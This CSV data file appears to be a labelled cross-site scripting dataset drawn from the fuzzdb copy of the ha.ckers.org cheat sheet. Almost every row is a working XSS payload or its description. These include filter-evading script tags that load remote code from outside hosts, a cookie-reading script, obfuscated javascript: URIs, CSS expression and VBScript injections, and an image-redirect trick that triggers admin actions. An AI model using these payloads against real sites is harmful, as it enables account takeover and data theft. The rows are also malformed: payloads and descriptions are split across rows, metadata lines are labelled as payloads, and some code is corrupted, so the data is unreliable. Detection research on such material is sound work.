id,payload,label
fuzzdb_912,"Exploit Tags: general, JS breaking",xss
fuzzdb_913,Author Name: ha.ckers.org,xss
fuzzdb_914,Evade Regex Filter 1,xss
fuzzdb_915,Exploit Name: Evade Regex Filter 1,xss
fuzzdb_916,"Exploit String: <SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_917,Exploit Description: For performing XSS on sites that allow ”<SCRIPT>” but don't allow ”<SCRIPT SRC...” by way of the following regex filter: /<script[^>]+src/i,xss
fuzzdb_918,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_919,Author Name: ha.ckers.org,xss
fuzzdb_920,Evade Regex Filter 2,xss
fuzzdb_921,Exploit Name: Evade Regex Filter 2,xss
fuzzdb_922,"Exploit String: <SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_923,"Exploit Description: For performing XSS on sites that allow ”<SCRIPT>” but don't allow ”<SCRIPT SRC...” by way of a regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i this is an important one, because I've seen this regex in the wild)",xss
fuzzdb_924,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_925,Author Name: ha.ckers.org,xss
fuzzdb_926,Evade Regex Filter 3,xss
fuzzdb_927,Exploit Name: Evade Regex Filter 3,xss
fuzzdb_928,"Exploit String: <SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_929,Exploit Description: Another XSS to evade this regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,xss
fuzzdb_930,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_931,Author Name: ha.ckers.org,xss
fuzzdb_932,Evade Regex Filter 4,xss
fuzzdb_933,Exploit Name: Evade Regex Filter 4,xss
fuzzdb_934,"Exploit String: <SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_935,Exploit Description: Yet another XSS to evade the same filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,xss
fuzzdb_936,The only thing I've seen work against this XSS attack if you still want to allow <SCRIPT> tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags),xss
fuzzdb_937,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_938,Author Name: ha.ckers.org,xss
fuzzdb_939,Evade Regex Filter 5,xss
fuzzdb_940,Exploit Name: Evade Regex Filter 5,xss
fuzzdb_941,"Exploit String: <SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_942,Exploit Description: And one last XSS attack (using grave accents) to evade this regex: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,xss
fuzzdb_943,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_944,Author Name: ha.ckers.org,xss
fuzzdb_945,Eval string contained in name property,xss
fuzzdb_946,Exploit Name: Eval string contained in name property,xss
fuzzdb_947,Exploit String: eval(name),xss
fuzzdb_948,Exploit Description: This very simple but effective vector uses the eval method on the name property.,xss
fuzzdb_949,"Exploit Tags: general, super short, self contained",xss
fuzzdb_950,Author Name: SIrDarckCat,xss
fuzzdb_951,Extra dot for Absolute DNS,xss
fuzzdb_952,Exploit Name: Extra dot for Absolute DNS,xss
fuzzdb_953,"Exploit String: <A HREF=""http://www.google.com./"">XSS</A>",xss
fuzzdb_954,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss
fuzzdb_955,"Exploit Tags: general, evil tags",xss
fuzzdb_956,Author Name: ha.ckers.org,xss
fuzzdb_957,Extraneous Open Brackets,xss
fuzzdb_958,Exploit Name: Extraneous Open Brackets,xss
fuzzdb_959,"Exploit String: <<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
fuzzdb_960,"Exploit Description: (Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.",xss
fuzzdb_961,"Exploit Tags: general, obfuscated",xss
fuzzdb_962,Author Name: ha.ckers.org,xss
fuzzdb_963,Filter Evasion 1,xss
fuzzdb_964,Exploit Name: Filter Evasion 1,xss
fuzzdb_965,"Exploit String: <SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_966,"Exploit Description: This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.",xss
fuzzdb_967,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_968,Author Name: ha.ckers.org,xss
fuzzdb_969,Filter Evasion 2,xss
fuzzdb_970,Exploit Name: Filter Evasion 2,xss
fuzzdb_971,"Exploit String: <SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
fuzzdb_972,Exploit Description: Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.,xss
fuzzdb_973,"Exploit Tags: general, evil tags, obfuscated, injection",xss
fuzzdb_974,Author Name: ha.ckers.org,xss
fuzzdb_975,Firefox Lookups 1,xss
fuzzdb_976,Exploit Name: Firefox Lookups 1,xss
fuzzdb_977,"Exploit String: <A HREF=""//google"">XSS</A>",xss
fuzzdb_978,Exploit Description: Firefox uses Google's ”feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's ”keyword:” protocol. You can concatenate several keywords by using something like the following ”keyword:XSS+RSnake”,xss
fuzzdb_979,"Exploit Tags: general, evil tags, gecko",xss
fuzzdb_980,Author Name: ha.ckers.org,xss
fuzzdb_981,Firefox Lookups 2,xss
fuzzdb_982,Exploit Name: Firefox Lookups 2,xss
fuzzdb_983,"Exploit String: <A HREF=""http://ha.ckers.org@google"">XSS</A>",xss
fuzzdb_984,"Exploit Description: This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the ”feeling lucky” function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.",xss
fuzzdb_985,"Exploit Tags: general, evil tags, obfuscated, gecko",xss
fuzzdb_986,Author Name: ha.ckers.org,xss
fuzzdb_987,Firefox Lookups 3,xss
fuzzdb_988,Exploit Name: Firefox Lookups 3,xss
fuzzdb_989,"Exploit String: <A HREF=""http://google:ha.ckers.org"">XSS</A>",xss
fuzzdb_990,"Exploit Description: This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the ”feeling lucky” function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case ”google”).",xss
fuzzdb_991,"Exploit Tags: general, evil tags, obfuscated, gecko",xss
fuzzdb_992,Author Name: ha.ckers.org,xss
fuzzdb_993,firefoxurl: uri exploit (UXSS),xss
fuzzdb_994,Exploit Name: firefoxurl: uri exploit (UXSS),xss
fuzzdb_995,"Exploit String: firefoxurl:test|""%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');""",xss
fuzzdb_996,Exploit Description: This vector creates an UXSS via firefoxurl:,xss
fuzzdb_997,"Exploit Tags: URI exploits, general, injection, obfuscated, internet explorer",xss
fuzzdb_998,Author Name: xs-sniper,xss
fuzzdb_999,FRAME,xss
fuzzdb_1000,Exploit Name: FRAME,xss
fuzzdb_1001,"Exploit String: <FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
fuzzdb_1002,Exploit Description: Frame (Frames have the same sorts of XSS problems as iframes).,xss
fuzzdb_1003,"Exploit Tags: general, evil tags, style injection, internet explorer",xss
fuzzdb_1004,Author Name: ha.ckers.org,xss
fuzzdb_1005,Grave Accents,xss
fuzzdb_1006,Exploit Name: Grave Accents,xss
fuzzdb_1007,"Exploit String: <IMG SRC=`javascript:alert(""RSnake says### 'XSS'"")`>",xss
fuzzdb_1008,Exploit Description: Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).,xss
fuzzdb_1009,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss
fuzzdb_1010,Author Name: ha.ckers.org,xss
fuzzdb_1011,Half-Open HTML/JavaScript,xss
fuzzdb_1012,Exploit Name: Half-Open HTML/JavaScript,xss
fuzzdb_1013,"Exploit String: <IMG SRC=""javascript:alert('XSS')""",xss
fuzzdb_1014,"Exploit Description: Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the ”javascript:” directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close > tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:",xss
fuzzdb_1015,/((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/,xss
fuzzdb_1016,"As a side note, this was also effective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag.",xss
fuzzdb_1017,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1018,Author Name: ha.ckers.org,xss
fuzzdb_1019,Hex Encoding,xss
fuzzdb_1020,Exploit Name: Hex Encoding,xss
fuzzdb_1021,"Exploit String: <A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
fuzzdb_1022,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss
fuzzdb_1023,"The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.",xss
fuzzdb_1024,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1025,Author Name: ha.ckers.org,xss
fuzzdb_1026,Hex Encoding w/out Semicolons,xss
fuzzdb_1027,Exploit Name: Hex Encoding w/out Semicolons,xss
fuzzdb_1028,Exploit String: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
fuzzdb_1029,Exploit Description: Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).,xss
fuzzdb_1030,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss
fuzzdb_1031,Author Name: ha.ckers.org,xss
fuzzdb_1032,HTML Entities,xss
fuzzdb_1033,Exploit Name: HTML Entities,xss
fuzzdb_1034,Exploit String: <IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
fuzzdb_1035,Exploit Description: HTML entities (the semicolons are required for this to work).,xss
fuzzdb_1036,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss
fuzzdb_1037,Author Name: ha.ckers.org,xss
fuzzdb_1038,HTML Quoute & Comment breaker,xss
fuzzdb_1039,Exploit Name: HTML Quoute & Comment breaker,xss
fuzzdb_1040,"Exploit String: '';!--""<script>alert(0);</script>=&{(alert(1))}",xss
fuzzdb_1041,Exploit Description: This vector breaks HTML quotes and comments.,xss
fuzzdb_1042,"Exploit Tags: general, html breaking, comment breaking",xss
fuzzdb_1043,Author Name: .mario,xss
fuzzdb_1044,HTML wrapped in XML,xss
fuzzdb_1045,Exploit Name: HTML wrapped in XML,xss
fuzzdb_1046,"Exploit String: <?xml version=""1.0""?>",xss
fuzzdb_1047,<html:html xmlns:html='http://www.w3.org/1999/xhtml'>,xss
fuzzdb_1048,<html:script>,xss
fuzzdb_1049,alert(document.cookie);,xss
fuzzdb_1050,</html:script>,xss
fuzzdb_1051,</html:html>,xss
fuzzdb_1052,Exploit Description: This vector uses HTML wrapped in XML and can be used to circumvent common filters. This works in Gecko based browsers only.,xss
fuzzdb_1053,"Exploit Tags: general, XML injection, evil tags, gecko, obfuscated",xss
fuzzdb_1054,Author Name: SIrDarckCat,xss
fuzzdb_1055,IE backticked semicolon injection,xss
fuzzdb_1056,Exploit Name: IE backticked semicolon injection,xss
fuzzdb_1057,Exploit String: <img src=`x` onrerror= ` ;; alert(1) ` />,xss
fuzzdb_1058,Exploit Description: This vector utilized back ticks as attribute delimiters. This works only in IE.,xss
fuzzdb_1059,"Exploit Tags: general, injection, internet explorer",xss
fuzzdb_1060,Author Name: .mario,xss
fuzzdb_1061,IE closing-tag expression injection,xss
fuzzdb_1062,Exploit Name: IE closing-tag expression injection,xss
fuzzdb_1063,"Exploit String: </a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">",xss
fuzzdb_1064,Exploit Description: This vector exploits a bug in IE whre attributes in closing comments are evaluated.,xss
fuzzdb_1065,"Exploit Tags: general, injection, internet explorer",xss
fuzzdb_1066,Author Name: .mario,xss
fuzzdb_1067,IE expression injection,xss
fuzzdb_1068,Exploit Name: IE expression injection,xss
fuzzdb_1069,"Exploit String:  style=color: expression(alert(0));"" a=""",xss
fuzzdb_1070,Exploit Description: This vector utilizes the feature of CSS expressions in IE.,xss
fuzzdb_1071,"Exploit Tags: general, injection, internet explorer, style injection",xss
fuzzdb_1072,Author Name: .mario,xss
fuzzdb_1073,IE VB Messagebox injection,xss
fuzzdb_1074,Exploit Name: IE VB Messagebox injection,xss
fuzzdb_1075,Exploit String: vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
fuzzdb_1076,Exploit Description: This injects VB code and produces a message box. IE only.,xss
fuzzdb_1077,"Exploit Tags: general, basic, internet explorer",xss
fuzzdb_1078,Author Name: .mario,xss
fuzzdb_1079,IFRAME,xss
fuzzdb_1080,Exploit Name: IFRAME,xss
fuzzdb_1081,"Exploit String: <IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
fuzzdb_1082,Exploit Description: Iframe (If iframes are allowed there are a lot of other XSS problems as well).,xss
fuzzdb_1083,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1084,Author Name: ha.ckers.org,xss
fuzzdb_1085,Image onerror wrapped in XML statement,xss
fuzzdb_1086,Exploit Name: Image onerror wrapped in XML statement,xss
fuzzdb_1087,Exploit String: a=<a>,xss
fuzzdb_1088,<b>,xss
fuzzdb_1089,%3c%69%6d%67%2f%73%72%63%3d%31,xss
fuzzdb_1090,%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e,xss
fuzzdb_1091,</b>,xss
fuzzdb_1092,</a>,xss
fuzzdb_1093,document.write(unescape(a..b)),xss
fuzzdb_1094,Exploit Description: This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.,xss
fuzzdb_1095,"Exploit Tags: general, obfuscated, gecko, XML predicates, evil tags",xss
fuzzdb_1096,Author Name: .mario,xss
fuzzdb_1097,Image tag with obfuscated JS URI,xss
fuzzdb_1098,Exploit Name: Image tag with obfuscated JS URI,xss
fuzzdb_1099,"Exploit String: <IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">",xss
fuzzdb_1100,"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",xss
fuzzdb_1101,"<IMG SRC=""jav&#x0D;ascript:alert(<WBR>'XSS');"">",xss
fuzzdb_1102,Exploit Description: This vector creates three image tags with differing CRLF obfuscation in the javascript: URI.,xss
fuzzdb_1103,"Exploit Tags: general, basic, obfuscated, evil tags, internet explorer",xss
fuzzdb_1104,Author Name: OWASP,xss
fuzzdb_1105,Image w/CharCode,xss
fuzzdb_1106,Exploit Name: Image w/CharCode,xss
fuzzdb_1107,Exploit String: <IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>,xss
fuzzdb_1108,Exploit Description: If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.,xss
fuzzdb_1109,"Exploit Tags: general, evil tags, obfuscated, internet explorer",xss
fuzzdb_1110,Author Name: ha.ckers.org,xss
fuzzdb_1111,IMG Dynsrc,xss
fuzzdb_1112,Exploit Name: IMG Dynsrc,xss
fuzzdb_1113,"Exploit String: <IMG DYNSRC=""javascript:alert('XSS');"">",xss
fuzzdb_1114,Exploit Description: IMG Dynsrc,xss
fuzzdb_1115,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1116,Author Name: ha.ckers.org,xss
fuzzdb_1117,IMG Embedded commands 1,xss
fuzzdb_1118,Exploit Name: IMG Embedded commands 1,xss
fuzzdb_1119,"Exploit String: <IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
fuzzdb_1120,"Exploit Description: This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.",xss
fuzzdb_1121,"Exploit Tags: general, evil tags",xss
fuzzdb_1122,Author Name: ha.ckers.org,xss
fuzzdb_1123,IMG Embedded commands 2,xss
fuzzdb_1124,Exploit Name: IMG Embedded commands 2,xss
fuzzdb_1125,Exploit String: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,xss
fuzzdb_1126,Exploit Description: IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=”http://badguy.com/a.jpg”> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).,xss
fuzzdb_1127,"Exploit Tags: general, redirect",xss
fuzzdb_1128,Author Name: ha.ckers.org,xss
fuzzdb_1129,IMG Lowsrc,xss
fuzzdb_1130,Exploit Name: IMG Lowsrc,xss
fuzzdb_1131,"Exploit String: <IMG LOWSRC=""javascript:alert('XSS');"">",xss
fuzzdb_1132,Exploit Description: IMG Lowsrc,xss
fuzzdb_1133,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1134,Author Name: ha.ckers.org,xss
fuzzdb_1135,IMG No Quotes/Semicolon,xss
fuzzdb_1136,Exploit Name: IMG No Quotes/Semicolon,xss
fuzzdb_1137,Exploit String: <IMG SRC=javascript:alert('XSS')>,xss
fuzzdb_1138,Exploit Description: No quotes and no semicolon,xss
fuzzdb_1139,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1140,Author Name: ha.ckers.org,xss
fuzzdb_1141,IMG STYLE w/expression,xss
fuzzdb_1142,Exploit Name: IMG STYLE w/expression,xss
fuzzdb_1143,"Exploit String: exp/*<XSS STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",xss
fuzzdb_1144,"Exploit Description: IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).",xss
fuzzdb_1145,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1146,Author Name: ha.ckers.org,xss
fuzzdb_1147,IMG w/JavaScript Directive,xss
fuzzdb_1148,Exploit Name: IMG w/JavaScript Directive,xss
fuzzdb_1149,"Exploit String: <IMG SRC=""javascript:alert('XSS');"">",xss
fuzzdb_1150,Exploit Description: Image XSS using the JavaScript directive.,xss
fuzzdb_1151,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1152,Author Name: ha.ckers.org,xss
fuzzdb_1153,IMG w/VBscript,xss
fuzzdb_1154,Exploit Name: IMG w/VBscript,xss
fuzzdb_1155,"Exploit String: <IMG SRC='vbscript:msgbox(""XSS"")'>",xss
fuzzdb_1156,Exploit Description: VBscript in an image,xss
fuzzdb_1157,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1158,Author Name: ha.ckers.org,xss
fuzzdb_1159,INPUT Image,xss
fuzzdb_1160,Exploit Name: INPUT Image,xss
fuzzdb_1161,"Exploit String: <INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
fuzzdb_1162,Exploit Description: INPUT Image,xss
fuzzdb_1163,"Exploit Tags: general, evil tags, internet explorer",xss
fuzzdb_1164,Author Name: ha.ckers.org,xss
fuzzdb_1165,IP Encoding,xss
fuzzdb_1166,Exploit Name: IP Encoding,xss
fuzzdb_1167,"Exploit String: <A HREF=""http://66.102.7.147/"">XSS</A>",xss
fuzzdb_1168,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).,xss
fuzzdb_1169,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1170,Author Name: ha.ckers.org,xss
fuzzdb_1171,JavaScript concatenation vector variant 1,xss
fuzzdb_1172,Exploit Name: JavaScript concatenation vector variant 1,xss
fuzzdb_1173,Exploit String: s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1,xss
fuzzdb_1174,Exploit Description: This vector concatenates a string and evaluates it via mapping on URL,xss
fuzzdb_1175,"Exploit Tags: general, internet explorer, concatenated, obfuscated",xss
fuzzdb_1176,Author Name: PHPIDS Group,xss
fuzzdb_1177,JavaScript concatenation vector variant 2,xss
fuzzdb_1178,Exploit Name: JavaScript concatenation vector variant 2,xss
fuzzdb_1179,Exploit String: s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;,xss
fuzzdb_1180,Exploit Description: This vector concatenates a string and evaluates it via self-execution.,xss
fuzzdb_1181,"Exploit Tags: general, concatenated, obfuscated",xss
fuzzdb_1182,Author Name: PHPIDS Group,xss
fuzzdb_1183,JavaScript concatenation vector variant 3,xss
fuzzdb_1184,Exploit Name: JavaScript concatenation vector variant 3,xss
fuzzdb_1185,Exploit String: s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);,xss
fuzzdb_1186,Exploit Description: This vector concatenates a string and evaluates it via usage of common DOM methods and element creation.,xss
fuzzdb_1187,"Exploit Tags: general, concatenated, obfuscated",xss
fuzzdb_1188,Author Name: PHPIDS Group,xss
fuzzdb_1189,JavaScript concatenation vector variant 4,xss
fuzzdb_1190,Exploit Name: JavaScript concatenation vector variant 4,xss
fuzzdb_1191,Exploit String: s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];,xss
fuzzdb_1192,Exploit Description: This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.,xss
fuzzdb_1193,"Exploit Tags: general, JSON, concatenated, obfuscated",xss
fuzzdb_1194,Author Name: PHPIDS Group,xss
fuzzdb_1195,JavaScript concatenation vector variant 5,xss
fuzzdb_1196,Exploit Name: JavaScript concatenation vector variant 5,xss
fuzzdb_1197,Exploit String: s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];,xss
fuzzdb_1198,Exploit Description: This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a JSON array.,xss
fuzzdb_1199,"Exploit Tags: general, JSON, concatenated, obfuscated",xss
fuzzdb_1200,Author Name: PHPIDS Group,xss
fuzzdb_1201,JavaScript concatenation vector variant 6,xss
fuzzdb_1202,Exploit Name: JavaScript concatenation vector variant 6,xss
fuzzdb_1203,Exploit String: s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;,xss
fuzzdb_1204,Exploit Description: This vector concatenates a string and evaluates it via filling the URL property with payload concatenated in a string  via ternary operators.,xss
fuzzdb_1205,"Exploit Tags: general, internet explorer, concatenated, obfuscated",xss
fuzzdb_1206,Author Name: PHPIDS Group,xss
fuzzdb_1207,JavaScript concatenation vector variant 7,xss
fuzzdb_1208,Exploit Name: JavaScript concatenation vector variant 7,xss
fuzzdb_1209,Exploit String: s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';,xss
fuzzdb_1210,Exploit Description: This vector concatenates a string and evaluates it via filling a variable with payload concatenated in a regular string via ternary operators.,xss
fuzzdb_1211,"Exploit Tags: general, JSON, concatenated, obfuscated",xss
fuzzdb_1212,Author Name: PHPIDS Group,xss
fuzzdb_1213,JavaScript Includes,xss
fuzzdb_1214,Exploit Name: JavaScript Includes,xss
fuzzdb_1215,"Exploit String: <BR SIZE=""&{alert('XSS')}"">",xss
fuzzdb_1216,Exploit Description: &JavaScript includes (works in Netscape 4.x).,xss
fuzzdb_1217,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1218,Author Name: ha.ckers.org,xss
fuzzdb_1219,JavaScript Link Location,xss
fuzzdb_1220,Exploit Name: JavaScript Link Location,xss
fuzzdb_1221,"Exploit String: <A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>",xss
fuzzdb_1222,Exploit Description: URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed),xss
fuzzdb_1223,JavaScript link location,xss
fuzzdb_1224,"Exploit Tags: general, evil tags, obfuscated, redirect",xss
fuzzdb_1225,Author Name: ha.ckers.org,xss
fuzzdb_1226,JavaScript-breaker using carriage return,xss
fuzzdb_1227,Exploit Name: JavaScript-breaker using carriage return,xss
fuzzdb_1228,Exploit String: %0da=eval;b=alert;a(b(/d/.source));,xss
fuzzdb_1229,Exploit Description: This vector uses an urlencoded carriage return to break JS code and produce an alert afterwards.,xss
fuzzdb_1230,"Exploit Tags: general, JS breaking, CRLF",xss
fuzzdb_1231,Author Name: kishor,xss
fuzzdb_1232,JS link with whitespace obfuscation,xss
fuzzdb_1233,Exploit Name: JS link with whitespace obfuscation,xss
fuzzdb_1234,"Exploit String: <a href          =              ""javas  cript   :ale                            rt(1)"">test",xss
fuzzdb_1235,Exploit Description: This vector utilizes whitespace to obfuscate and contains a JS link.,xss
fuzzdb_1236,"Exploit Tags: general, evil tags, obfuscated",xss
fuzzdb_1237,Author Name: thespanner.co.uk,xss
fuzzdb_1238,JS string concatenation breaker,xss
fuzzdb_1239,Exploit Name: JS string concatenation breaker,xss
fuzzdb_1240,Exploit String: +alert(0)+,xss
fuzzdb_1241,Exploit Description: This can be used when input is concatenated in JavaScript.,xss
fuzzdb_1242,"Exploit Tags: general, JS breaking, basic",xss
fuzzdb_1243,Author Name: .mario,xss
fuzzdb_1244,JSON based obfuscated onload vector,xss
fuzzdb_1245,Exploit Name: JSON based obfuscated onload vector,xss
fuzzdb_1246,Exploit String: <body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;,xss
fuzzdb_1247,Exploit Description: This vector injects a new body tag and utilized the onload event to modify the DOM. JSON parenthesis and semicolons are to evade filters.,xss
